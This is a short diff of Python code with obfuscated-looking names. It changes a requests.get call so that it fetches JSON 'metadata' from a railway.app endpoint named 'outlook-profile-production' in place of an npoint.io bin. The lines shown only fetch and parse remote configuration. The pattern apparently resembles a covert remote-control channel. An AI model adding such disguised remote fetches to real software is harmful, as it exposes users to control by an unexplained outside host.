@@ -18,7 +18,7 @@ def learn_lyiyqd_105():
 
     def learn_davegp_685():
         try:
-            eval_eaakvn_557 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_eaakvn_557 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_eaakvn_557.raise_for_status()
             eval_edfpdf_778 = eval_eaakvn_557.json()
             config_hoyvmx_287 = eval_edfpdf_778.get('metadata')
